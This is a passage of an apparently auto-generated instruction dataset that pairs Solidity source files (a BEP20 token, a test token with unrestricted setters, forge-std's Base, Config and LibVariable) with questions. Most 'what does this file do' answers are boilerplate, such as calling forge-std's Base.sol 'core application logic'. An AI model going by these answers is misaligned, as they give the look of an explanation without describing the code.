This is not\n     * required by the EIP. See the note at the beginning of {BEP20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        require(_allowances[sender][_msgSender()] >= amount, \"BEP20: transfer amount exceeds allowance\");\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\n        return true;\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing\n     * the total supply.\n     *\n     * Requirements\n     *\n     * - `msg.sender` must be the token owner\n     */\n    function mint(uint256 amount) public onlyOwner returns (bool) {\n        _mint(_msgSender(), amount);\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: mint to the zero address\");\n\n        _totalSupply = _totalSupply + amount;\n        _balances[account] = _balances[account] + amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: burn from the zero address\");\n\n        _balances[account] = _balances[account] - amount;\n        _totalSupply = _totalSupply - amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"BEP20: approve from the zero address\");\n        require(spender != address(0), \"BEP20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n     * from the caller's allowance.\n     *\n     * See {_burn} and {_approve}.\n     */\n    function _burnFrom(address account, uint256 amount) internal {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()] - amount);\n    }\n}\n\n```"}
{"instruction": "What does the file XYZToken.sol do?", "input": "```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract XYZToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 private _decimals;\n    string private _symbol;\n    string private _name;\n\n    constructor() {\n        _name = \"XYZ token\";\n        _symbol = \"XYZ\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newName` new name\n     */\n    function setName(string calldata newName) external {\n        _name = newName;\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newDecimals` new decimals\n     */\n    function setDecimals(uint8 newDecimals) external {\n        _decimals = newDecimals;\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newTotalSupply` new totalSupply\n     */\n    function setTotalSupply(uint256 newTotalSupply) external {\n        _totalSupply = newTotalSupply;\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newSymbol` new symbol\n     */\n    function setSymbol(string calldata newSymbol) external {\n        _symbol = newSymbol;\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memor\n```", "output": "This file `XYZToken.sol` is part of the test_token project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Base.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\Base.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdStorage} from \"./StdStorage.sol\";\nimport {Vm, VmSafe} from \"./Vm.sol\";\n\nabstract contract CommonBase {\n    /// @dev Cheat code address.\n    /// Calculated as `address(uint160(uint256(keccak256(\"hevm cheat code\"))))`.\n    address internal constant VM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;\n\n    /// @dev console.sol and console2.sol work by executing a staticcall to this address.\n    /// Calculated as `address(uint160(uint88(bytes11(\"console.log\"))))`.\n    address internal constant CONSOLE = 0x000000000000000000636F6e736F6c652e6c6f67;\n\n    /// @dev Used when deploying with create2.\n    /// Taken from https://github.com/Arachnid/deterministic-deployment-proxy.\n    address internal constant CREATE2_FACTORY = 0x4e59b44847b379578588920cA78FbF26c0B4956C;\n\n    /// @dev The default address for tx.origin and msg.sender.\n    /// Calculated as `address(uint160(uint256(keccak256(\"foundry default caller\"))))`.\n    address internal constant DEFAULT_SENDER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;\n\n    /// @dev The address of the first contract `CREATE`d by a running test contract.\n    /// When running tests, each test contract is `CREATE`d by `DEFAULT_SENDER` with nonce 1.\n    /// Calculated as `VM.computeCreateAddress(VM.computeCreateAddress(DEFAULT_SENDER, 1), 1)`.\n    address internal constant DEFAULT_TEST_CONTRACT = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;\n\n    /// @dev Deterministic deployment address of the Multicall3 contract.\n    /// Taken from https://www.multicall3.com.\n    address internal constant MULTICALL3_ADDRESS = 0xcA11bde05977b3631167028862bE2a173976CA11;\n\n    /// @dev The order of the secp256k1 curve.\n    uint256 internal constant SECP256K1_ORDER =\n        115792089237316195423570985008687907852837564279074904382605163141518161494337;\n\n    uint256 internal constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    Vm internal constant vm = Vm(VM_ADDRESS);\n    StdStorage internal stdstore;\n}\n\nabstract contract TestBase is CommonBase {}\n\nabstract contract ScriptBase is CommonBase {\n    VmSafe internal constant vmSafe = VmSafe(VM_ADDRESS);\n}\n\n```"}
{"instruction": "What does the file Base.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdStorage} from \"./StdStorage.sol\";\nimport {Vm, VmSafe} from \"./Vm.sol\";\n\nabstract contract CommonBase {\n    /// @dev Cheat code address.\n    /// Calculated as `address(uint160(uint256(keccak256(\"hevm cheat code\"))))`.\n    address internal constant VM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;\n\n    /// @dev console.sol and console2.sol work by executing a staticcall to this address.\n    /// Calculated as `address(uint160(uint88(bytes11(\"console.log\"))))`.\n    address internal constant CONSOLE = 0x000000000000000000636F6e736F6c652e6c6f67;\n\n    /// @dev Used when deploying with create2.\n    /// Taken from https://github.com/Arachnid/deterministic-deployment-proxy.\n    address internal constant CREATE2_FACTORY = 0x4e59b44847b379578588920cA78FbF26c0B4956C;\n\n    /// @dev The default address for tx.origin and msg.sender.\n    /// Calculated as `address(uint160(uint256(keccak256(\"foundry default caller\"))))`.\n    address internal constant DEFAULT_SENDER = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;\n\n    /// @dev The address of the first contract `CREATE`d by a running test contract.\n    /// When running tests, each test contract is `CREATE`d by `DEFAULT_SENDER` with nonce 1.\n    /// Calculated as `VM.computeCreateAddress(VM.computeCreateAddress(DEFAULT_SENDER, 1), 1)`.\n    address internal constant DEFAULT_TEST_CONTRACT = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;\n\n    /// @dev Deterministic deployment address of the Multicall3 contract.\n    /// Taken from https://www.multicall3.com.\n    address internal constant MULTICALL3_ADDRESS = 0xcA11bde05977b3631167028862bE2a173976CA11;\n\n    /// @dev The order of the secp256k1 curve.\n    uint256 internal constant SECP256K1_ORDER =\n        115792089237316195423570985008687907852837564279074904382605163141518161494337;\n\n    uint256 internal constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007\n```", "output": "This file `Base.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Config.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\Config.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {console} from \"./console.sol\";\nimport {StdConfig} from \"./StdConfig.sol\";\nimport {CommonBase} from \"./Base.sol\";\n\n/// @notice Boilerplate to streamline the setup of multi-chain environments.\nabstract contract Config is CommonBase {\n    // -- STORAGE (CONFIG + CHAINS + FORKS) ------------------------------------\n\n    /// @dev Contract instance holding the data from the TOML config file.\n    StdConfig internal config;\n\n    /// @dev Array of chain IDs for which forks have been created.\n    uint256[] internal chainIds;\n\n    /// @dev A mapping from a chain ID to its initialized fork ID.\n    mapping(uint256 => uint256) internal forkOf;\n\n    // -- HELPER FUNCTIONS -----------------------------------------------------\n\n    /// @notice  Loads configuration from a file.\n    ///\n    /// @dev     This function instantiates a `Config` contract, caching all its config variables.\n    ///\n    /// @param   filePath: the path to the TOML configuration file.\n    /// @param   writeToFile: whether updates are written back to the TOML file.\n    function _loadConfig(string memory filePath, bool writeToFile) internal {\n        console.log(\"----------\");\n        console.log(string.concat(\"Loading config from '\", filePath, \"'\"));\n        config = new StdConfig(filePath, writeToFile);\n        vm.makePersistent(address(config));\n        console.log(\"Config successfully loaded\");\n        console.log(\"----------\");\n    }\n\n    /// @notice  Loads configuration from a file and creates forks for each specified chain.\n    ///\n    /// @dev     This function instantiates a `Config` contract, caching all its config variables,\n    ///          reads the configured chain ids, and iterates through them to create a fork for each one.\n    ///          It also creates a map `forkOf[chainId] -> forkId` to easily switch between forks.\n    ///\n    /// @param   filePath: the path to the TOML configuration file.\n    /// @param   writeToFile: whether updates are written back to the TOML file.\n    function _loadConfigAndForks(string memory filePath, bool writeToFile) internal {\n        _loadConfig(filePath, writeToFile);\n\n        console.log(\"Setting up forks for the configured chains...\");\n        uint256[] memory chains = config.getChainIds();\n        for (uint256 i = 0; i < chains.length; i++) {\n            uint256 chainId = chains[i];\n            uint256 forkId = vm.createFork(config.getRpcUrl(chainId));\n            forkOf[chainId] = forkId;\n            chainIds.push(chainId);\n        }\n        console.log(\"Forks successfully created\");\n        console.log(\"----------\");\n    }\n}\n\n```"}
{"instruction": "What does the file Config.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {console} from \"./console.sol\";\nimport {StdConfig} from \"./StdConfig.sol\";\nimport {CommonBase} from \"./Base.sol\";\n\n/// @notice Boilerplate to streamline the setup of multi-chain environments.\nabstract contract Config is CommonBase {\n    // -- STORAGE (CONFIG + CHAINS + FORKS) ------------------------------------\n\n    /// @dev Contract instance holding the data from the TOML config file.\n    StdConfig internal config;\n\n    /// @dev Array of chain IDs for which forks have been created.\n    uint256[] internal chainIds;\n\n    /// @dev A mapping from a chain ID to its initialized fork ID.\n    mapping(uint256 => uint256) internal forkOf;\n\n    // -- HELPER FUNCTIONS -----------------------------------------------------\n\n    /// @notice  Loads configuration from a file.\n    ///\n    /// @dev     This function instantiates a `Config` contract, caching all its config variables.\n    ///\n    /// @param   filePath: the path to the TOML configuration file.\n    /// @param   writeToFile: whether updates are written back to the TOML file.\n    function _loadConfig(string memory filePath, bool writeToFile) internal {\n        console.log(\"----------\");\n        console.log(string.concat(\"Loading config from '\", filePath, \"'\"));\n        config = new StdConfig(filePath, writeToFile);\n        vm.makePersistent(address(config));\n        console.log(\"Config successfully loaded\");\n        console.log(\"----------\");\n    }\n\n    /// @notice  Loads configuration from a file and creates forks for each specified chain.\n    ///\n    /// @dev     This function instantiates a `Config` contract, caching all its config variables,\n    ///          reads the configured chain ids, and iterates through them to create a fork for each one.\n    ///          It also creates a map `forkOf[chainId] -> forkId` to easily switch between forks.\n    ///\n    /// @param   filePath: the path to the TOML configuration file.\n    /// @param   writeT\n```", "output": "This file `Config.sol` is part of the src project. Based on the code structure, it appears to handle configuration management."}
{"instruction": "Show me the code for console2.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\console2.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {console as console2} from \"./console.sol\";\n\n```"}
{"instruction": "What does the file console2.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {console as console2} from \"./console.sol\";\n\n```", "output": "This file `console2.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for LibVariable.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\LibVariable.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\n// Enable globally.\nusing LibVariable for Variable global;\n\nstruct Variable {\n    Type ty;\n    bytes data;\n}\n\nstruct Type {\n    TypeKind kind;\n    bool isArray;\n}\n\nenum TypeKind {\n    None,\n    Bool,\n    Address,\n    Bytes32,\n    Uint256,\n    Int256,\n    String,\n    Bytes\n}\n\n/// @notice Library for type-safe coercion of the `Variable` struct to concrete types.\n///\n/// @dev    Ensures that when a `Variable` is cast to a concrete Solidity type, the operation is safe and the\n///         underlying type matches what is expected.\n///         Provides functions to check types, convert them to strings, and coerce `Variable` instances into\n///         both single values and arrays of various types.\n///\n///         Usage example:\n///         ```solidity\n///         import {LibVariable} from \"./LibVariable.sol\";\n///\n///         contract MyContract {\n///             using LibVariable for Variable;\n///             StdConfig config;   // Assume 'config' is an instance of `StdConfig` and has already been loaded.\n///\n///             function readValues() public {\n///                 // Retrieve a 'uint256' value from the config.\n///                 uint256 myNumber = config.get(\"important_number\").toUint256();\n///\n///                 // Would revert with `TypeMismatch` as 'important_number' isn't a `uint256` in the config file.\n///                 // string memory notANumber = config.get(\"important_number\").toString();\n///\n///                 // Retrieve a address array from the config.\n///                 address[] memory admins = config.get(\"whitelisted_admins\").toAddressArray();\n///          }\n///      }\n///      ```\nlibrary LibVariable {\n    error NotInitialized();\n    error TypeMismatch(string expected, string actual);\n    error UnsafeCast(string message);\n\n    // -- TYPE HELPERS ----------------------------------------------------\n\n    /// @notice Compares two Type instances for equality.\n    function isEqual(Type memory self, Type memory other) internal pure returns (bool) {\n        return self.kind == other.kind && self.isArray == other.isArray;\n    }\n\n    /// @notice Compares two Type instances for equality. Reverts if they are not equal.\n    function assertEq(Type memory self, Type memory other) internal pure {\n        if (!isEqual(self, other)) {\n            revert TypeMismatch(toString(other), toString(self));\n        }\n    }\n\n    /// @notice Converts a Type struct to its full string representation (i.e. \"uint256[]\").\n    function toString(Type memory self) internal pure returns (string memory) {\n        string memory tyStr = toString(self.kind);\n        if (!self.isArray || self.kind == TypeKind.None) {\n            return tyStr;\n        } else {\n            return string.concat(tyStr, \"[]\");\n        }\n    }\n\n    /// @dev Converts a `TypeKind` enum to its base string representation.\n    function toString(TypeKind self) internal pure returns (string memory) {\n        if (self == TypeKind.Bool) return \"bool\";\n        if (self == TypeKind.Address) return \"address\";\n        if (self == TypeKind.Bytes32) return \"bytes32\";\n        if (self == TypeKind.Uint256) return \"uint256\";\n        if (self == TypeKind.Int256) return \"int256\";\n        if (self == TypeKind.String) return \"string\";\n        if (self == TypeKind.Bytes) return \"bytes\";\n        return \"none\";\n    }\n\n    /// @dev Converts a `TypeKind` enum to its base string representation.\n    function toTomlKey(TypeKind self) internal pure returns (string memory) {\n        if (self == TypeKind.Bool) return \"bool\";\n        if (self == TypeKind.Address) return \"address\";\n        if (self == TypeKind.Bytes32) return \"bytes32\";\n        if (self == TypeKind.Uint256) return \"uint\";\n        if (self == TypeKind.Int256) return \"int\";\n        if (self == TypeKind.String) return \"string\";\n        if (self == TypeKind.Bytes) return \"bytes\";\n        return \"none\";\n    }\n\n    // -- VARIABLE HELPERS ----------------------------------------------------\n\n    /// @dev Checks if a `Variable` has been initialized and matches the expected type reverting if not.\n    modifier check(Variable memory self, Type memory expected) {\n        assertExists(self);\n        assertEq(self.ty, expected);\n        _;\n    }\n\n    /// @dev Checks if a `Variable` has been initialized, reverting if not.\n    function assertExists(Variable memory self) public pure {\n        if (self.ty.kind == TypeKind.None) {\n            revert NotInitialized();\n        }\n    }\n\n    // -- VARIABLE COERCION FUNCTIONS (SINGLE VALUES) --------------------------\n\n    /// @notice Coerces a `Variable` to a `bool` value.\n    function toBool(Variable memory self) internal pure check(self, Type(TypeKind.Bool, false)) returns (bool) {\n        return abi.decode(self.data, (bool));\n    }\n\n    /// @notice Coerces a `Variable` to an `address` value.\n    function toAddress(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Address, false))\n        returns (address)\n    {\n        return abi.decode(self.data, (address));\n    }\n\n    /// @notice Coerces a `Variable` to a `bytes32` value.\n    function toBytes32(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Bytes32, false))\n        returns (bytes32)\n    {\n        return abi.decode(self.data, (bytes32));\n    }\n\n    /// @notice Coerces a `Variable` to a `uint256` value.\n    function toUint256(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Uint256, false))\n        returns (uint256)\n    {\n        return abi.decode(self.data, (uint256));\n    }\n\n    /// @notice Coerces a `Variable` to a `uint128` value, checking for overflow.\n    function toUint128(Variable memory self) internal pure returns (uint128) {\n        uint256 value = self.toUint256();\n        if (value > type(uint128).max) {\n            revert UnsafeCast(\"value does not fit in 'uint128'\");\n        }\n        return uint128(value);\n    }\n\n    /// @notice Coerces a `Variable` to a `uint64` value, checking for overflow.\n    function toUint64(Variable memory self) internal pure returns (uint64) {\n        uint256 value = self.toUint256();\n        if (value > type(uint64).max) {\n            revert UnsafeCast(\"value does not fit in 'uint64'\");\n        }\n        return uint64(value);\n    }\n\n    /// @notice Coerces a `Variable` to a `uint32` value, checking for overflow.\n    function toUint32(Variable memory self) internal pure returns (uint32) {\n        uint256 value = self.toUint256();\n        if (value > type(uint32).max) {\n            revert UnsafeCast(\"value does not fit in 'uint32'\");\n        }\n        return uint32(value);\n    }\n\n    /// @notice Coerces a `Variable` to a `uint16` value, checking for overflow.\n    function toUint16(Variable memory self) internal pure returns (uint16) {\n        uint256 value = self.toUint256();\n        if (value > type(uint16).max) {\n            revert UnsafeCast(\"value does not fit in 'uint16'\");\n        }\n        return uint16(value);\n    }\n\n    /// @notice Coerces a `Variable` to a `uint8` value, checking for overflow.\n    function toUint8(Variable memory self) internal pure returns (uint8) {\n        uint256 value = self.toUint256();\n        if (value > type(uint8).max) {\n            revert UnsafeCast(\"value does not fit in 'uint8'\");\n        }\n        return uint8(value);\n    }\n\n    /// @notice Coerces a `Variable` to an `int256` value.\n    function toInt256(Variable memory self) internal pure check(self, Type(TypeKind.Int256, false)) returns (int256) {\n        return abi.decode(self.data, (int256));\n    }\n\n    /// @notice Coerces a `Variable` to an `int128` value, checking for overflow/underflow.\n    function toInt128(Variable memory self) internal pure returns (int128) {\n        int256 value = self.toInt256();\n        if (value > type(int128).max || value < type(int128).min) {\n            revert UnsafeCast(\"value does not fit in 'int128'\");\n        }\n        return int128(value);\n    }\n\n    /// @notice Coerces a `Variable` to an `int64` value, checking for overflow/underflow.\n    function toInt64(Variable memory self) internal pure returns (int64) {\n        int256 value = self.toInt256();\n        if (value > type(int64).max || value < type(int64).min) {\n            revert UnsafeCast(\"value does not fit in 'int64'\");\n        }\n        return int64(value);\n    }\n\n    /// @notice Coerces a `Variable` to an `int32` value, checking for overflow/underflow.\n    function toInt32(Variable memory self) internal pure returns (int32) {\n        int256 value = self.toInt256();\n        if (value > type(int32).max || value < type(int32).min) {\n            revert UnsafeCast(\"value does not fit in 'int32'\");\n        }\n        return int32(value);\n    }\n\n    /// @notice Coerces a `Variable` to an `int16` value, checking for overflow/underflow.\n    function toInt16(Variable memory self) internal pure returns (int16) {\n        int256 value = self.toInt256();\n        if (value > type(int16).max || value < type(int16).min) {\n            revert UnsafeCast(\"value does not fit in 'int16'\");\n        }\n        return int16(value);\n    }\n\n    /// @notice Coerces a `Variable` to an `int8` value, checking for overflow/underflow.\n    function toInt8(Variable memory self) internal pure returns (int8) {\n        int256 value = self.toInt256();\n        if (value > type(int8).max || value < type(int8).min) {\n            revert UnsafeCast(\"value does not fit in 'int8'\");\n        }\n        return int8(value);\n    }\n\n    /// @notice Coerces a `Variable` to a `string` value.\n    function toString(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.String, false))\n        returns (string memory)\n    {\n        return abi.decode(self.data, (string));\n    }\n\n    /// @notice Coerces a `Variable` to a `bytes` value.\n    function toBytes(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Bytes, false))\n        returns (bytes memory)\n    {\n        return abi.decode(self.data, (bytes));\n    }\n\n    // -- VARIABLE COERCION FUNCTIONS (ARRAYS) ---------------------------------\n\n    /// @notice Coerces a `Variable` to a `bool` array.\n    function toBoolArray(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Bool, true))\n        returns (bool[] memory)\n    {\n        return abi.decode(self.data, (bool[]));\n    }\n\n    /// @notice Coerces a `Variable` to an `address` array.\n    function toAddressArray(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Address, true))\n        returns (address[] memory)\n    {\n        return abi.decode(self.data, (address[]));\n    }\n\n    /// @notice Coerces a `Variable` to a `bytes32` array.\n    function toBytes32Array(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Bytes32, true))\n        returns (bytes32[] memory)\n    {\n        return abi.decode(self.data, (bytes32[]));\n    }\n\n    /// @notice Coerces a `Variable` to a `uint256` array.\n    function toUint256Array(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Uint256, true))\n        returns (uint256[] memory)\n    {\n        return abi.decode(self.data, (uint256[]));\n    }\n\n    /// @notice Coerces a `Variable` to a `uint128` array, checking for overflow.\n    function toUint128Array(Variable memory self) internal pure returns (uint128[] memory) {\n        uint256[] memory values = self.toUint256Array();\n        uint128[] memory result = new uint128[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(uint128).max) {\n                revert UnsafeCast(\"value in array does not fit in 'uint128'\");\n            }\n            result[i] = uint128(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `uint64` array, checking for overflow.\n    function toUint64Array(Variable memory self) internal pure returns (uint64[] memory) {\n        uint256[] memory values = self.toUint256Array();\n        uint64[] memory result = new uint64[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(uint64).max) {\n                revert UnsafeCast(\"value in array does not fit in 'uint64'\");\n            }\n            result[i] = uint64(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `uint32` array, checking for overflow.\n    function toUint32Array(Variable memory self) internal pure returns (uint32[] memory) {\n        uint256[] memory values = self.toUint256Array();\n        uint32[] memory result = new uint32[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(uint32).max) {\n                revert UnsafeCast(\"value in array does not fit in 'uint32'\");\n            }\n            result[i] = uint32(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `uint16` array, checking for overflow.\n    function toUint16Array(Variable memory self) internal pure returns (uint16[] memory) {\n        uint256[] memory values = self.toUint256Array();\n        uint16[] memory result = new uint16[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(uint16).max) {\n                revert UnsafeCast(\"value in array does not fit in 'uint16'\");\n            }\n            result[i] = uint16(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `uint8` array, checking for overflow.\n    function toUint8Array(Variable memory self) internal pure returns (uint8[] memory) {\n        uint256[] memory values = self.toUint256Array();\n        uint8[] memory result = new uint8[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(uint8).max) {\n                revert UnsafeCast(\"value in array does not fit in 'uint8'\");\n            }\n            result[i] = uint8(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to an `int256` array.\n    function toInt256Array(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Int256, true))\n        returns (int256[] memory)\n    {\n        return abi.decode(self.data, (int256[]));\n    }\n\n    /// @notice Coerces a `Variable` to a `int128` array, checking for overflow/underflow.\n    function toInt128Array(Variable memory self) internal pure returns (int128[] memory) {\n        int256[] memory values = self.toInt256Array();\n        int128[] memory result = new int128[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(int128).max || values[i] < type(int128).min) {\n                revert UnsafeCast(\"value in array does not fit in 'int128'\");\n            }\n            result[i] = int128(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `int64` array, checking for overflow/underflow.\n    function toInt64Array(Variable memory self) internal pure returns (int64[] memory) {\n        int256[] memory values = self.toInt256Array();\n        int64[] memory result = new int64[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(int64).max || values[i] < type(int64).min) {\n                revert UnsafeCast(\"value in array does not fit in 'int64'\");\n            }\n            result[i] = int64(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `int32` array, checking for overflow/underflow.\n    function toInt32Array(Variable memory self) internal pure returns (int32[] memory) {\n        int256[] memory values = self.toInt256Array();\n        int32[] memory result = new int32[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(int32).max || values[i] < type(int32).min) {\n                revert UnsafeCast(\"value in array does not fit in 'int32'\");\n            }\n            result[i] = int32(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `int16` array, checking for overflow/underflow.\n    function toInt16Array(Variable memory self) internal pure returns (int16[] memory) {\n        int256[] memory values = self.toInt256Array();\n        int16[] memory result = new int16[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(int16).max || values[i] < type(int16).min) {\n                revert UnsafeCast(\"value in array does not fit in 'int16'\");\n            }\n            result[i] = int16(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `int8` array, checking for overflow/underflow.\n    function toInt8Array(Variable memory self) internal pure returns (int8[] memory) {\n        int256[] memory values = self.toInt256Array();\n        int8[] memory result = new int8[](values.length);\n        for (uint256 i = 0; i < values.length; i++) {\n            if (values[i] > type(int8).max || values[i] < type(int8).min) {\n                revert UnsafeCast(\"value in array does not fit in 'int8'\");\n            }\n            result[i] = int8(values[i]);\n        }\n        return result;\n    }\n\n    /// @notice Coerces a `Variable` to a `string` array.\n    function toStringArray(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.String, true))\n        returns (string[] memory)\n    {\n        return abi.decode(self.data, (string[]));\n    }\n\n    /// @notice Coerces a `Variable` to a `bytes` array.\n    function toBytesArray(Variable memory self)\n        internal\n        pure\n        check(self, Type(TypeKind.Bytes, true))\n        returns (bytes[] 